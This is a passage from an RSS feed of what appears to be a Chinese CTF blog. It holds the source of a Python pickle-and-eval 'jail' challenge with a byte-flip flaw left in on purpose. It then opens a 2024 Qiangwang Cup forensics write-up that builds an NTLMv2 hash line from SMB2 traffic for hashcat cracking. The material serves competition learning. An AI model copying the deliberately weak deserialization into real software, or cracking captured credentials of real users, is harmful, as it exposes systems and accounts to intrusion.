style=&#34;display:flex;&#34;&gt;&lt;span&gt;Faker&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seed(time())&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fake &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Faker(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en_US&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Path(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read_text()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(_):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buffer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buffer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;(_&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, limit: int &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; _:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(_)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buffer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline(limit)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;buffer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; _&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bye&lt;/span&gt;(_):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(_)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    _exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;players &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [fake&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unique&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first_name()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode() &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to this jail game!&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Play this game to get the flag with these players: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;players&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;So... What&amp;#39;s your name?&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; players, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You are already joined!&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;players&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(name)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;biox &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BytesIO()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Pickler(biox)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        players,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        flag,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytearray(biox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getvalue())&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter a random number to win: &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; num &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(data), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You are not allowed to win!&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data[num] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data[num] &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; name, players, flag&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;biox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stderr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    safe_dic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__builtins__&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: BytesIO(data),&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;F&amp;#34;&lt;/span&gt;: type(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;, (Unpickler,), {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;find_class&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;H4cker&amp;#34;&lt;/span&gt;}),&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    name, players, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eval(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;F(n).load()&amp;#34;&lt;/span&gt;, safe_dic, {})&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; players:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; _&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; joined this game, but here is no flag!&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;What happened? IDK...&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bye(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Break this jail to get the flag!&amp;#34;&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;分析附件&#34;&gt;分析附件：&lt;a href=&#34;#%e5%88%86%e6%9e%90%e9%99%84%e4%bb%b6&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;一上来这个代码就给我看懵了，对于python基本功不是很扎实的我，没看懂逻辑，一边拿ai一边分析。&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024强网杯—谍影重重5.0</title>
      <link>http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/</link>
      <pubDate>Thu, 21 Nov 2024 21:35:04 +0800</pubDate>
      <guid>http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/</guid>
      <description>&lt;p&gt;😉🌃⛅😉&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;乍一看，有arp、smb、tls等协议流量&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496_hu9800888644822544776.webp 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496_hu578084286021447862.webp 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496_hu10969375510139454078.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496_hu16682716559524951807.png 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496_hu3434879189039180929.png 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130102444496_hu9006378844287911329.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241130102444496&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;1302&#34;&#xA;        height=&#34;694&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;先过滤出smb2流量看看&lt;/p&gt;&#xA;&lt;p&gt;smb协议主要用于在计算机间共享文件、打印机、串口等&lt;/p&gt;&#xA;&lt;p&gt;NTLM是一种身份验证机制&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093_hu15785230462260875486.webp 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093_hu16541133201433629481.webp 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093_hu1219271686193763935.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093_hu5481919004509919801.png 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093_hu10706498272393430346.png 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130104443093_hu4095339330437139116.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241130104443093&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;1872&#34;&#xA;        height=&#34;649&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;smb2爆破&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;a&#xA;  href=&#34;https://blog.csdn.net/hapenl/article/details/126816047&#34;&#xA;  &#xA;  &#xA;    class=&#34;link--external&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&#xA;  &#xA;&gt;Wireshark分析&amp;ndash;SMB2协议包及hashcat爆破_wireshark smb-CSDN博客&lt;/a&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;通过文章了解到需要构造hash文件&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username::domain:NTLM Server Challenge:ntproofstr:不包含ntproofstr的ntlmv2_response值&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;双击打开这条流量&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945_hu5240127376476489642.webp 300w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945_hu1714473045441225181.webp 500w,/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945_hu12160618999275977680.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0.assets/image-20241130105942945.png&#34;&#xA;        